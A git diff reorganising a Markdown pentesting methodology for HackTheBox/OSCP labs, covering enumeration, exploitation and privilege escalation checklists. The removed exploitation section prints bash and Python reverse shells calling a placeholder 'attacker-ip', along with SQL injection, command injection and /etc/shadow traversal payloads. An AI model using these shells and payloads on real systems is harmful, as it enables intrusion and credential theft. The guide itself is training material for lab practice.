@@ -55,375 +55,6 @@ The attacker’s first responsibility is to understand the target.
 
 * Detect services, versions, and potential misconfigurations.
 * Build a profile: OS type, roles (AD, web server, mail), likely attack vectors.
-
-**Mindset principle:**
-
-> Tools discover services. Humans discover vulnerabilities.
-
-### **2.2 Service Enumeration**
-
-For each open port:
-
-* **Web (80/443)**
-
-  * `gobuster`, `feroxbuster` → enumerate directories
-  * `nikto`/manual browsing → fingerprint frameworks
-  * Look for login panels, upload areas, API endpoints, debug consoles
-  * Analyze cookies, headers, JS for clues
-
-* **SMB**
-
-  * `smbclient -L`
-  * Try anonymous access
-  * Enumerate shares for configs, credentials, scripts
-  * Check permissions (read/write)
-
-* **LDAP/AD Services (Forest, Active, Blackfield)**
-
-  * `ldapsearch`, `enum4linux-ng`, `rpcclient`
-  * Enumerate domain users, groups, ACLs
-  * Identify attack paths (Kerberoasting, AS-REP roast, LDAP misconfigs)
-
-* **Databases** (MySQL, PostgreSQL, MongoDB)
-
-  * Check for default credentials
-  * Enumerate users, tables, stored procedures
-  * Search for passwords or file-write functionality
-
-**Why:**
-Services reveal both the **technology stack** and **developer intent**, which often hints at the vulnerability.
-
----
-
-## **Phase 2: Attack Surface Analysis**
-
-### **2.3 Identify Vulnerabilities**
-
-Typical categories:
-
-* **Outdated software (Old WordPress, Tomcat, Jenkins)**
-  → search CVEs
-* **Misconfigurations (anonymous SMB, writable scripts)**
-  → abuse trust relationships
-* **Logic flaws (password resets, weak auth)**
-  → bypass security
-* **Injection opportunities (SQLi, LDAPi, SSTI)**
-  → dump DBs, escalate privileges
-* **Exposed credentials (config files, logs)**
-  → pivot to services
-
-### **2.4 Tool Choices**
-
-Tools are not the goal—they support reasoning.
-
-Common attacker tools:
-
-* Recon: `nmap`, `gobuster`, `feroxbuster`
-* Credential attacks: `hydra`, `hashcat`, `john`, `kerbrute`
-* AD attacks: `impacket-*`, `evil-winrm`, BloodHound
-* Web exploitation: Burp Suite, curl, ffuf
-* Reverse shells: `nc`, `socat`, msfvenom (sparingly)
-* Post exploitation: `pspy`, `linpeas`, `winPEAS`
-
-**Why these tools?**
-Each tool either:
-
-* reduces uncertainty
-* extracts hidden data
-* or automates noisy tasks
-
----
-
-## **Phase 3: Initial Foothold**
-
-This is the transition from **remote enumeration** to **code execution or authenticated access**.
-
-### Common foothold patterns across HTB:
-
-* Command injection via web apps
-* Unrestricted file upload → web shell
-* Leaking credentials → SSH or RDP
-* Using AD misconfig: AS-REP Roast, Kerberoast
-* Exploiting misconfigured databases (file write, auth bypass)
-* Abuse of password reuse across services
-
-**Reasoning approach:**
-
-> If credentials appear anywhere, test them everywhere.
-
----
-
-## **Phase 4: Post-Exploitation & Privilege Escalation**
-
-### **4.1 Linux PrivEsc Mindset**
-
-Identify:
-
-* **World-writable scripts**, cron jobs → code execution
-* **Capabilities** (e.g., python with cap_setuid)
-* **SUID binaries** (search: `find / -perm -4000`)
-* **Credentials in configs**
-* **Docker/LXC misconfig** → breakout
-* **NFS root_squash disabled** → root shell
-* **Kernel exploits** when environment allows
-
-### **4.2 Windows PrivEsc Mindset**
-
-Focus on:
-
-* **Token impersonation (JuicyPotato/PrintSpoofer)**
-* **Bad ACLs** on AD objects
-* **Kerberoast / AS-REP Roast**
-* **Unquoted Service Paths**
-* **Privilege escalation via scheduled tasks**
-* **DLL hijacking**
-# Methodology — Consolidated Process
-
-This document consolidates the `process/` folder into a single, ordered methodology reference for reconnaissance, exploitation, and privilege escalation. It combines best-practices, checklists and recommended workflows.
-
-## Contents
-
-- Introduction & Approach
-- Enumeration Checklist
-- Machine Checklist (OSCP-style flow)
-- Exploitation Workflow
-- Privilege Escalation Methodology
-- Notes & References
-
----
-
-## Introduction & Approach
-
-This section captures the recommended learning path and mindset before attacking HTB/OSCP-style machines. Focus on foundational skills (Linux, Windows, networking), core tools, and a repeatable methodology: Enumeration → Exploitation → Privilege Escalation → Post-Exploitation.
-
-Key learning areas:
-
-- Linux fundamentals (filesystem, permissions, systemctl, common CLI tools, bash scripting)
-- Windows fundamentals (PowerShell, services, registry, AD basics)
-- Networking basics (TCP/IP, DNS, HTTP/HTTPS)
-- Tools: `nmap`, `gobuster`/`ffuf`, Burp Suite, `sqlmap`, `netcat`
-- Mindset: patience, curiosity, systematic note-taking
-
-Recommended progression before intermediate/advanced boxes:
-
-1. PortSwigger Academy — web fundamentals
-2. TryHackMe — Jr PenTester pathway
-3. OverTheWire (Bandit) — Linux CLI practice
-4. HTB Starting Point → easy HTB boxes → medium/hard boxes
-
----
-
-## Enumeration Checklist
-
-Systematic reconnaissance and service enumeration for every machine.
-
-### Phase 1: Host Discovery
-
-- Ping sweep (if applicable)
-- Identify target IP/hostname
-- Document target OS from early probes
-
-### Phase 2: Port Scanning
-
-- Initial quick scan: `nmap -p- --open -T4 <target>`
-- Service/version detection: `nmap -sV -sC -p <ports> -oN nmap-detailed.txt <target>`
-
-### Phase 3: HTTP/HTTPS Enumeration
-
-- Manual inspection (browser)
-- Directory fuzzing: `gobuster`, `ffuf`, `dirsearch`
-- Check `robots.txt`, `sitemap.xml`, JS files for endpoints
-- Intercept traffic with Burp Suite and map parameters/endpoints
-
-### Phase 4: SMB / FTP / DB / SSH Enumeration
-
-- SMB: `smbclient -L //<IP>/`, `enum4linux`
-- FTP: test anonymous login
-- DB: attempt connections, check default creds
-- SSH: banner/version checks
-
-### Phase 5: Credential Harvesting & Vulnerability Mapping
-
-- Search files/configs for credentials (LFI, uploads, repo files)
-- Cross-reference versions with Exploit-DB / searchsploit
-- Document all findings and prepare for exploitation
-
----
-
-## HackTheBox Machine Checklist (OSCP-style)
-
-Use this flow for every box — start to finish.
-
-### Pre-Engagement
-
-- Create machine folder and notes file
-- Start VPN and confirm connectivity
-- Add discovered hostnames to `/etc/hosts` as needed
-
-### Initial Recon / Enumeration
-
-- Run `nmap` scans and record open ports & services
-- Use `gobuster`/`ffuf` for web directories
-- Note any admin panels, upload endpoints, or API routes
-
-### Identify & Exploit Foothold
-
-- Prioritize vectors (LFI, SQLi, file upload, RCE, auth bypass)
-- Validate vulnerabilities manually before automating
-- Host payloads and catch reverse shells (nc, socat)
-- Stabilize shells and gather initial post-exploitation info
-
-### Post-Exploitation
-
-- Run initial enumeration (`id`, `sudo -l`, `uname -a`, `find` for SUID)
-- Search for credentials, cron jobs, writable scripts, and capabilities
-
-### Flags & Documentation
-
-- Capture `user.txt` and `root.txt` (or platform equivalents)
-- Record full exploitation chain, commands, and evidence
-
----
-
-## Exploitation Workflow
-
-A structured approach to vulnerability testing and exploitation.
-
-### Pre‑Exploitation
-
-- Review enumeration and prioritize by likely impact & feasibility
-- Prepare tools and shell handlers
-
-### Vulnerability Validation
-
-- Confirm POC, understand the input → processing → output chain
-- Map what access level an exploit provides (user, service, system)
-
-### Web Application Exploits (common)
-
-- SQL Injection (manual tests + `sqlmap`)
-- RCE via file upload, command injection, SSTI, or deserialization
-- LFI leading to RCE through log poisoning or wrappers
-- Unprotected functionality and auth bypasses
-
-### System/Network Exploits
-
-- Research CVEs with `searchsploit` and adapt PoCs
-- Test misconfigurations (default creds, open shares, exposed management)
-
-### Shell Acquisition & Stabilization
-
-- Establish reverse/bind shell, stabilize TTY, check execution context
-
-### Post‑Exploit Enumeration
-
-- Enumerate user, groups, services, mounted filesystems, and network
-- Locate sensitive files and escalation vectors
-
----
-
-## Privilege Escalation Methodology
-
-Techniques for escalating from an initial shell to root/SYSTEM.
-
-### Linux Privesc (ordered checklist)
-
-1. Information gathering: `whoami`, `id`, `sudo -l`, kernel version, container checks
-2. SUID/GUID binaries: `find / -perm -4000 2>/dev/null`
-3. Writable directories & scripts: look for scripts executed by root or cron
-4. Sudo misconfigurations: test `sudo -l` results (wildcards, binaries that allow shell escapes)
-5. Cron jobs: inspect `/etc/crontab`, `/etc/cron.d/*`, user crons
-6. Capabilities: `getcap -r / 2>/dev/null`
-7. Kernel exploits (last resort): research CVEs for local privilege escalation
-8. Credential hunting: history files, config files, SSH keys
-
-### Windows Privesc (ordered checklist)
-
-1. Information gathering: `whoami /priv`, `systeminfo`, check UAC and patches
-2. Service enumeration: unquoted service paths, writable service directories
-3. Token abuse: SeImpersonatePrivilege and impersonation tools
-4. Registry and file permissions: writable HKLM, scripts, installers
-5. Scheduled tasks: check tasks running as SYSTEM or admin
-6. Known CVEs & service exploits
-
----
-
-## Notes, Tools & Resources
-
-Helpful tools referenced throughout the methodology:
-
-- `nmap`, `gobuster`/`ffuf`, `burp suite`, `sqlmap`, `netcat`, `searchsploit`
-- Enumeration scripts: `linPEAS`, `winPEAS`, `LinEnum`
-- Privilege escalation resources: GTFOBins, HackTricks, Exploit-DB
-
-Guidelines
-
-- Keep methodical notes and capture exact commands and outputs
-- Prefer manual validation over blind automation
-- When merging notes or archives, keep section headers like `Merged from <path>` for traceability
-
----
-
-*This consolidated methodology was generated by combining the individual files in the `process/` folder. If you'd like a different section order, more detail in any area, or a TOC with internal links, tell me and I'll refine it.*
-
-
----
-
-<!-- Merged from: approach.md on 2025-11-21T16:14:09.275846Z -->
-
-## Merged from `approach.md`
-
-### Approach: What to Learn Before Starting HackTheBox
-
-This is a clear, structured roadmap of what you should learn before starting HackTheBox (HTB) machines — especially if your goal is OSCP or structured pentesting skill growth.
-
----
-
-#### ✔️ 1. Core Technical Foundations
-
-These are non-negotiable basics.
-
-##### Linux fundamentals
-
-- File system navigation & permissions
-- System services (`systemctl`, networking tools)
-- Common CLI utilities: `grep`, `sed`, `awk`, `find`, `curl`, `wget`, `nc`
-- Bash scripting basics
-- Package management (`apt`, `yum`)
-
-##### Windows fundamentals
-
-- Command Prompt & PowerShell basics
-- File system & permissions
-- Understanding of services, registry, scheduled tasks
-- Basic Active Directory concepts (users, groups, domains)
-
-##### Networking fundamentals
-
-- TCP/IP, ports, protocols
-- DNS, HTTP/HTTPS
-- Subnetting & routing (just enough to know what you’re seeing in scans)
-- Firewall behavior basics
-
----
-
-#### ✔️ 2. Pentesting Methodology (OSCP-style)
-
-Before touching machines, learn the process.
-
-##### Enumeration → Exploitation → Privilege Escalation → Post-Exploitation
-
-- How to enumerate thoroughly
-- How to keep notes
-- How to pivot when something doesn’t work
-- How to escalate in both Linux & Windows environments
-
----
-
-#### ✔️ 3. Tools You Must Be Comfortable With
-
-These tools appear in nearly every HTB machine.
-
 ##### Scanning & Enumeration
 
 - `nmap` (aggressive scan, scripts, service detection)
@@ -436,296 +67,6 @@ These tools appear in nearly every HTB machine.
 - Manual testing of parameters
 
 ##### Exploitation
-
-- Metasploit (optional for OSCP, useful for HTB)
-- `msfvenom` payloads
-- Netcat / Socat / SSH tricks
-- Reverse shell stabilisation (pty, `stty`, python)
-
-##### Scripting
-
-- Using Python, bash, or PowerShell to automate small tasks
-- Writing simple PoC scripts
-
----
-
-#### ✔️ 4. Common Vulnerabilities You Should Understand
-
-HTB machines heavily rely on these categories.
-
-##### Web vulns
-
-- Command injection
-- File uploads
-- LFI/RFI
-- SQLi
-- XSS (mostly for foothold)
-- SSRF
-- Path traversal
-- Authentication bypass techniques
-
-##### System vulns
-
-- SUID binaries
-- Cron jobs
-- PATH hijacking
-- Capabilities
-- Kernel exploits (less common now)
-
-##### Windows vulns
-
-- Misconfigured services
-- Privilege escalation shortcuts like:
-  - Unquoted service paths
-  - Weak permissions
-  - UAC bypass
-  - Token abuse
-  - Exploitable scheduled tasks
-- Basic AD privesc:
-  - Kerberoasting
-  - AS-REP roasting
-  - Pass-the-Hash
-  - Bloodhound enumeration
-
----
-
-#### ✔️ 5. Exploit Research Skills
-
-Before attacking real HTB machines, you should know how to:
-
-- Search Exploit-DB and adapt exploits
-- Patch broken PoC scripts
-- Modify Python2 → Python3
-- Understand CVE write-ups well enough to replicate manually
-
----
-
-#### ✔️ 6. Privilege Escalation Knowledge (Huge part of HTB)
-
-##### Linux Privesc
-
-- SUID enumeration
-- `sudo` misconfigurations
-- Crontab jobs
-- Capabilities (`getcap -r /`)
-- PATH hijacking
-- File permissions misconfigurations
-- Docker/LXC escapes
-
-##### Windows Privesc
-
-- `winPEAS` / `seatbelt`
-- Privileges (SeImpersonatePrivilege, etc.)
-- Service permissions (`sc qc`, `accesschk`)
-- Registry permissions
-- PowerShell privesc methods
-- Basic AD privesc path-building
-
----
-
-#### ✔️ 7. Note-Taking & Documentation
-
-Learn one note system and stick to it:
-
-- Obsidian
-- CherryTree
-- Notion
-- OneNote
-- Markdown + Sublime
-
-Record:
-
-- Each enumeration step
-- Commands used
-- Service versions
-- Possible exploitation vectors
-- Credentials found
-- Privilege escalation findings
-
-Good notes = faster rooting in future machines.
-
----
-
-#### ✔️ 8. Mental Approach to CTF/Pentesting
-
-HTB machines require:
-
-- Patience
-- Curiosity
-- Ability to research effectively
-- Willingness to try multiple approaches
-- Logical elimination of dead ends
-
-Many people quit early because they expect HTB to be like a textbook — it is not. It’s puzzle-based pentesting.
-
----
-
-#### ✔️ 9. Early Training Before HTB
-
-These platforms are perfect warm-ups:
-
-##### Beginner Platforms
-
-- PortSwigger Web Academy
-- TryHackMe (complete “Jr Penetration Tester” and “Offensive Pentesting”)
-- VulnHub “OSCP-style” machines
-- OverTheWire Bandit (Linux CLI training)
-
-Once you’re comfortable, move to:
-
-##### HTB Starting Point + Tier 0/1
-
-This is where things start to feel like real OSCP exercises.
-
----
-
-#### ✔️ 10. Recommended order before doing HTB intermediate/advanced boxes
-
-1. PortSwigger → Learn core web vulns
-2. TryHackMe → Do Jr PenTester pathway
-3. OverTheWire → Do Bandit
-4. HTB Starting Point → Very easy machines
-5. HTB Easy machines → Build confidence
-6. HTB Medium/Hard machines → OSCP-level challenge
-
----
-
-#### Extras — Options I can prepare for you
-
-If you want, I can also create:
-
-- A personalized study roadmap based on your current level
-- A checklist you follow during every HTB machine
-- A daily practice plan leading up to OSCP
-
-Tell me which one you want next and I’ll generate it.
-
-
----
-
-<!-- Merged from: checklist.md on 2025-11-21T16:14:09.275846Z -->
-
-## Merged from `checklist.md`
-
-### ✅ HackTheBox Machine Checklist (OSCP-style)
-
-**Use this exact flow for every box — easy, medium, hard.**
-
----
-
-### 1️⃣ Pre-Engagement Setup
-
-- [ ] Create a machine folder: `mkdir HTB/<machine>`
-- [ ] Start a notes file (Obsidian/Markdown/CherryTree)
-- [ ] Start machine VPN connection (`openvpn <file>.ovpn`)
-- [ ] Ping target → confirm active
-- [ ] Add target to `/etc/hosts` if hostname discovered later
-
----
-
-### 2️⃣ Initial Recon / Enumeration
-
-##### 🔍 **Nmap Scan**
-
-- [ ] Run full TCP scan:
-
-```
-nmap -sV -sC -oN nmap_initial <IP>
-```
-
-- [ ] Run full port scan if needed:
-
-```
-nmap -p- -T4 --min-rate 5000 -oN nmap_full <IP>
-```
-
-- [ ] Record all open ports, versions, OS guesses
-- [ ] Identify potential attack surfaces
-
-  - Web servers
-  - Database ports
-  - SMB, SSH, FTP, RDP
-  - RPC, WinRM, SNMP
-  - High or unusual ports
-
----
-
-### 3️⃣ Service Enumeration (per port)
-
-##### 🌐 **If Web ports (80/443/etc)**
-
-- [ ] Visit site manually and note functionality
-- [ ] Use **gobuster/ffuf** for directory brute force
-- [ ] Look for hidden paths
-- [ ] Check robots.txt, sitemap.xml
-- [ ] Intercept traffic with Burp Suite
-- [ ] Enumerate parameters (use Param Miner if allowed)
-- [ ] Run nikto if relevant (`nikto -h <IP>`)
-
-##### 📁 **If SMB (445/139)**
-
-- [ ] `smbclient -L //<IP>/`
-- [ ] Try null or guest logins
-- [ ] Enumerate shares
-
-##### 🗂 **If FTP**
-
-- [ ] Try anonymous login
-- [ ] Mirror files if allowed
-
-##### 📡 **If SSH/WinRM/RDP**
-
-- [ ] Look for weak creds
-- [ ] Note banner versions
-- [ ] Prepare for bruteforcing only if ethically permitted (HTB usually allows)
-
-##### 🧬 **If Database Ports**
-
-- [ ] MySQL → test root/no password
-- [ ] PostgreSQL → test default creds
-- [ ] MongoDB → check for unauth access
-- [ ] Redis → test `redis-cli -h <IP>`
-
----
-
-### 4️⃣ Identify & Exploit Foothold
-
-##### 🔎 Search for vulnerabilities
-
-- [ ] Search Exploit-DB for version-specific vulns
-- [ ] Google unusual strings, headers, CMS versions
-- [ ] Check for:
-
-  - LFI/RFI
-  - SQL injection
-  - Command Injection
-  - SSRF
-  - File Upload misconfigurations
-  - Deserialization
-  - Weak authentication
-  - Misconfigured API endpoints
-
-##### 🧪 Test manually
-
-- [ ] Parameter tampering (via Burp)
-- [ ] Try basic payloads
-- [ ] Upload tests (double extension, bypasses)
-- [ ] URL manipulation
-
-##### 🛠 Exploitation
-
-- [ ] Run PoCs but analyze code first (never blindly run)
-- [ ] Modify Python2 → Python3 if needed
-- [ ] Host payloads using python HTTP server
-- [ ] Catch reverse shell (nc/socat)
-- [ ] Stabilize shell:
-
-```
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-CTRL+Z
-stty raw -echo; fg
-export TERM=xterm
-```
 
 ---
 
@@ -774,295 +115,202 @@ getcap -r / 2>/dev/null
 
 ```
 whoami /priv
+```markdown
+# Attacker Methodology — Cleaned & Organized
+
+This file consolidates the `process/` folder into a single, non-redundant reference. Content is ordered from basics → intermediate → advanced. Similar topics are grouped together and repeated items removed.
+
+## Contents
+
+- 1. Introduction & Prerequisites
+- 2. Pre-engagement / Setup
+- 3. Enumeration (host → service → application)
+- 4. Exploitation workflow
+- 5. Post-exploitation & stabilization
+- 6. Privilege escalation (Linux then Windows)
+- 7. Tools & resources
+- 8. Notes, documentation & ethics
+
+---
+
+## 1. Introduction & Prerequisites
+
+Goal: establish a repeatable approach to attacking lab/CTF machines so removing the original per-topic files does not lose important concepts.
+
+Essential foundations:
+- Linux basics: filesystem, users, services, package managers, shell scripting
+- Windows basics: PowerShell, services, registry, scheduled tasks
+- Networking: TCP/UDP, DNS, HTTP/HTTPS, basic routing/subnets
+- Development scripting: Python and shell scripting for small tools/PoCs
+
+Recommended training order:
+1. PortSwigger Web Academy (web fundamentals)
+2. OverTheWire (Bandit) for CLI skills
+3. TryHackMe / VulnHub practical boxes
+4. HTB Starting Point → Easy → Medium → Hard
+
+---
+
+## 2. Pre-engagement / Setup
+
+Checklist before attacking a target:
+- Create project folder and notes file for the machine
+- Ensure VPN connectivity and target reachability
+- Add discovered hostnames to `/etc/hosts` if needed
+- Prepare listeners and temporary hosts (nc, socat, python http.server)
+
+Quick commands (examples):
+```
+mkdir -p ~/labs/<machine>
+cd ~/labs/<machine>
+openvpn ~/keys/htb.ovpn
+nc -lvnp 9001
+python3 -m http.server 8000
 ```
 
-- [ ] Enumerate services:
+---
 
+## 3. Enumeration (host → service → application)
+
+Principle: start broad, then focus. Record everything.
+
+3.1 Host discovery
+- Confirm host is up (ping / nmap ping) and note any hostnames
+
+3.2 Port scanning
+- Initial fast scan: `nmap -p- -T4 --min-rate 1000 <target>`
+- Service detection: `nmap -sV -sC -p <ports> -oN nmap-service.txt <target>`
+
+3.3 Service-specific enumeration (per open port)
+- Web (80/443/8080…): browse manually, intercept with Burp, enumerate directories/endpoints (`gobuster`, `ffuf`), inspect JS for endpoints/credentials
+- SMB (445/139): `smbclient -L //<IP>/`, try anonymous, enumerate shares, download configs
+- Databases: attempt connections (MySQL, PostgreSQL, Mongo, MSSQL), test default credentials, search for file write or credential storage
+- SSH/WinRM/RDP: banner/version checks; save for later credential testing
+
+3.4 Automated and manual helpers
+- Use both manual inspection and quick automated checks: `nikto`, `searchsploit`, `enum4linux`, `ffuf`
+- Keep lists of endpoints, parameters, and interesting responses in your notes
+
+3.5 Credential harvesting
+- Search discovered files, backups, config files, JS, and logs for credentials
+- Try found credentials across all services (password reuse is common)
+
+---
+
+## 4. Exploitation workflow
+
+4.1 Prioritize
+- Rank candidates by impact, ease, and risk (e.g., RCE > info disclosure > fingerprinting)
+
+4.2 Validate first
+- Reproduce a minimal POC manually before running automated exploit code
+
+4.3 Web exploitation categories (common):
+- Injection: SQLi (extract DB), LDAPi, command injection
+- File handling: LFI, RFI, path traversal, file upload
+- Server-side flaws: SSTI, deserialization, insecure deserialization
+- Unprotected functionality: admin panels, API endpoints without auth
+
+4.4 System / network exploitation:
+- Look up versions in Exploit-DB / searchsploit and adapt PoC code
+- Test for default creds, open shares, and exposed management interfaces
+
+4.5 Shell acquisition & stabilization:
+- Acquire a shell (reverse/bind), then stabilize (pty), gather context (`whoami`, `id`, `pwd`)
+- Example stabilization:
 ```
-sc qc <service>
-```
-
-- [ ] Registry enumeration
-- [ ] Search for creds:
-
-  - unattended.xml
-  - files in Desktop/Documents
-  - config files
-- [ ] Token impersonation (if allowed)
-
----
-
-### 6️⃣ Privilege Escalation
-
-##### Linux Privesc Vectors
-
-- [ ] SUID binaries
-- [ ] Misconfigured sudo (`sudo -l`)
-- [ ] Cron jobs or scripts writable
-- [ ] PATH hijacking
-- [ ] Capabilities
-- [ ] Exploitable services
-- [ ] Docker/LXC breakout
-- [ ] Kernel exploit (rare but possible on HTB)
-
-##### Windows Privesc Vectors
-
-- [ ] Unquoted service paths
-- [ ] Weak service binaries permissions
-- [ ] Modifiable registry autoruns
-- [ ] Token impersonation (SeImpersonatePrivilege)
-- [ ] Scheduled tasks
-- [ ] Stored credentials in files
-
----
-
-### 7️⃣ Flags & Proof Collection
-
-- [ ] Read `user.txt`
-- [ ] Read `root.txt`
-- [ ] Save paths to both flags in notes
-- [ ] Confirm flags match HTB panel
-- [ ] (Optional) Capture screenshots for documentation
-
----
-
-### 8️⃣ Cleanup (Good Practice)
-
-- [ ] Remove uploaded payloads
-- [ ] Remove temporary accounts (if created)
-- [ ] Remove logs **only if allowed** (HTB resets anyway)
-
----
-
-### 9️⃣ Documentation
-
-Record:
-
-- Nmap results
-- Vulnerabilities found
-- Exploitation steps
-- Privesc method
-- Payloads used
-- Commands used
-- Files accessed
-- Final flags
-
-This becomes your personal knowledge base.
-
-
----
-
-<!-- Merged from: enumeration.md on 2025-11-21T16:14:09.275846Z -->
-
-## Merged from `enumeration.md`
-
-### Enumeration Checklist
-
-Systematic reconnaissance and service enumeration for HackTheBox machines.
-
-#### Phase 1: Host Discovery
-
-- [ ] Ping sweep (if network-based)
-- [ ] Identify target IP/hostname
-- [ ] Document target OS (Linux/Windows) from context or early probes
-
-#### Phase 2: Port Scanning
-
-- [ ] Run initial quick scan: `nmap -p- --open -T4 <target>`
-- [ ] Identify open ports and services
-- [ ] Note common ports: 22 (SSH), 80 (HTTP), 443 (HTTPS), 445 (SMB), 3306 (MySQL), 5432 (PostgreSQL), 8080 (HTTP alt), etc.
-
-#### Phase 3: Service Version Detection
-
-- [ ] Run service scan: `nmap -sV -p <ports> <target>`
-- [ ] Identify service versions for vulnerability mapping
-- [ ] Run script scan: `nmap -sC -p <ports> <target>` (if time allows)
-- [ ] Combine into detailed scan: `nmap -sV -sC -p <ports> -oN nmap-detailed.txt <target>`
-
-#### Phase 4: HTTP/HTTPS Enumeration
-
-- [ ] Check HTTP status: `curl -i http://<target>`
-- [ ] Run web spider/crawler:
-  - Burp Suite: Automatic crawl
-  - ffuf: `ffuf -u http://<target>/FUZZ -w /path/to/wordlist`
-  - dirsearch: `dirsearch -u http://<target> -w common.txt`
-- [ ] Enumerate common directories: `/admin`, `/app`, `/api`, `/uploads`, `/backup`, `/config`, etc.
-- [ ] Identify technologies (check response headers, HTML, JavaScript)
-- [ ] Document endpoints, parameters, forms
-
-#### Phase 5: SMB Enumeration (if SMB present)
-
-- [ ] List shares: `smbclient -L //<target>`
-- [ ] Enumerate shares for null sessions: `smbclient //<target>/share -N`
-- [ ] Run enum4linux or nmap smb scripts
-- [ ] Check for known CVEs (EternalBlue, etc.)
-
-#### Phase 6: SSH Enumeration (if SSH present)
-
-- [ ] Check SSH version: `ssh -v <target>`
-- [ ] Identify SSH software (OpenSSH version for known CVEs)
-- [ ] Note: SSH is often a secondary access vector; focus on other services first
-
-#### Phase 7: Database Enumeration (if DB present)
-
-- [ ] Attempt connection: `mysql -h <target> -u root` or similar
-- [ ] Identify database service (MySQL, PostgreSQL, MSSQL, etc.)
-- [ ] Check for default credentials
-- [ ] Enumerate databases/tables if accessible
-
-#### Phase 8: Credential Harvesting
-
-- [ ] Check common locations: `/etc/passwd`, `/etc/shadow` (via LFI), config files
-- [ ] Look for hardcoded credentials in code/config files
-- [ ] Check for weak default credentials on services
-- [ ] Use tools: `hashcat`, `john` for offline cracking if hashes found
-
-#### Phase 9: Vulnerability Identification
-
-- [ ] Cross‑reference service versions with known CVEs (searchsploit, Exploit-DB)
-- [ ] Test for common web vulnerabilities:
-  - SQL Injection (SQLi)
-  - Cross‑Site Scripting (XSS)
-  - Local File Inclusion (LFI)
-  - Remote Code Execution (RCE)
-  - Path Traversal
-  - Unprotected functionality
-  - CSRF, XXE, SSRF, etc.
-- [ ] Identify misconfigurations
-
-#### Phase 10: Documentation
-
-- [ ] Document all open ports, services, versions
-- [ ] Record interesting findings (default credentials, interesting endpoints, potential vulnerabilities)
-- [ ] Capture screenshots/outputs
-- [ ] Prepare for exploitation phase
-
-#### Tools Reference
-
-- **nmap** – Port scanning & service detection
-- **ffuf** – Web directory/parameter fuzzing
-- **burp suite** – Web proxy & analysis
-- **enum4linux** – SMB enumeration
-- **curl/wget** – Manual HTTP testing
-- **dirsearch** – Directory enumeration
-- **nikto** – Web server scanning (optional)
-
-#### Notes
-
-- Start broad (all ports), then narrow down (specific services).
-- Document everything; early findings may connect to later vectors.
-- Prioritize services with known public exploits.
-- Never assume a service is uninteresting until tested.
-
-
----
-
-<!-- Merged from: exploitation.md on 2025-11-21T16:14:09.275846Z -->
-
-## Merged from `exploitation.md`
-
-### Exploitation Workflow
-
-Systematic approach to vulnerability testing and exploitation for HackTheBox machines.
-
-#### Pre‑Exploitation Setup
-
-- [ ] Review enumeration results
-- [ ] Identify top vulnerability candidates (prioritize by CVSS, popularity, ease)
-- [ ] Prepare tools: Burp Suite, Metasploit (if allowed), manual exploit code
-- [ ] Set up shell handlers (nc, bash, meterpreter)
-
-#### Phase 1: Vulnerability Validation
-
-- [ ] Confirm vulnerability exists (POC or manual test)
-- [ ] Understand the vulnerability chain (input → processing → output)
-- [ ] Identify what access level it grants (user, service account, system)
-
-#### Phase 2: Exploitation Techniques
-
-##### Web Application Exploits
-
-- **SQL Injection (SQLi)**
-  - Test parameter: `' OR '1'='1`, `' UNION SELECT ...`, time‑based blind, error‑based
-  - Use sqlmap: `sqlmap -u "url" --data "params" --dbs`
-  - Extract usernames/passwords, read files, execute commands
-
-- **Remote Code Execution (RCE)**
-  - Upload shells: PHP, JSP, ASP, etc.
-  - Command injection: `; whoami`, `| id`, `$(command)`
-  - Template injection: SSTI, JSTL, Thymeleaf
-  - Deserialization exploits (Java, Python, .NET)
-
-- **Local File Inclusion (LFI)**
-  - Path traversal: `../../../etc/passwd`
-  - Log poisoning to achieve RCE (LFI + write capability)
-  - Read sensitive files: `/etc/passwd`, `/etc/shadow`, config files, SSH keys
-
-- **Unprotected Functionality**
-  - Access admin panels without authorization
-  - Bypass authentication or authorization checks
-  - Perform privileged actions
-
-##### System/Network Exploits
-
-- **Known CVEs**
-  - Research: `searchsploit <service> <version>`, Exploit-DB, GitHub
-  - Download/adapt exploits
-  - Test against target
-
-- **Misconfigurations**
-  - Default credentials
-  - Open SMB shares
-  - Exposed management interfaces
-  - Weak permissions
-
-- **Service‑Specific Exploits**
-  - SMB: EternalBlue (MS17‑010), nullsessions
-  - SSH: Version exploits, key extraction
-  - FTP: Anonymous upload/download
-  - DNS: Zone transfers, cache poisoning
-
-#### Phase 3: Shell Acquisition
-
-- [ ] Establish reverse shell or bind shell
-- [ ] Stabilize shell (interactive, TTY if possible)
-- [ ] Confirm command execution (whoami, id, pwd)
-- [ ] Check for shell restrictions (AppArmor, SELinux, etc.)
-
-##### Common Shell Methods
-
-```bash
-### Bash reverse shell
-bash -i >& /dev/tcp/attacker-ip/port 0>&1
-
-### Python
-python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker-ip",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
-
-### nc listener
-nc -lvnp port
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+CTRL-Z; stty raw -echo; fg; export TERM=xterm
 ```
 
-#### Phase 4: Post‑Exploitation (Initial Access)
+4.6 Documentation during exploitation:
+- Record exact payloads, commands, outputs, and any artifacts used
 
-- [ ] Enumerate current user and groups
-- [ ] List available files and directories
-- [ ] Identify sensitive files (config, credentials, SSH keys)
-- [ ] Check for other users or services
-- [ ] Map network interfaces and neighbors
+---
 
-#### Phase 5: Privilege Escalation
+## 5. Post-exploitation & stabilization
 
-See `privilege-escalation.md` for detailed techniques.
+5.1 Initial enumeration (once a shell is available)
+- User & groups: `whoami`, `id`, `groups`
+- System: `uname -a`, `cat /etc/os-release`
+- Sudo: `sudo -l`
+- Running processes & network: `ps aux`, `netstat -tunlp` or `ss -tunlp`
 
-- [ ] Identify privesc vector (kernel exploit, SUID binary, sudo, cron jobs, etc.)
-- [ ] Gain higher privileges (root/SYSTEM)
-- [ ] Capture root/system flag
+5.2 Search for immediate escalators
+- Config files, credentials, SSH keys, backups, world-writable scripts
+- Cron jobs and systemd timers that run as root
 
-#### Documentation During Exploitation
+5.3 Lateral movement (where applicable)
+- If credentials or tokens are found, attempt internal pivots (SSH, SMB, RPC)
+- For AD environments, enumerate domain users/groups and use BloodHound-style reasoning
 
-- Record the exact vulnerability or chain of vulnerabilities
-- Document commands and outputs
-- Capture proof (flags, /etc/passwd, etc.)
+5.4 Persistence & cleanup (labs only when allowed)
+- Prefer ephemeral access for CTFs; avoid persistence unless required
+- Clean temporary files and payloads if you're asked to by lab rules
+
+---
+
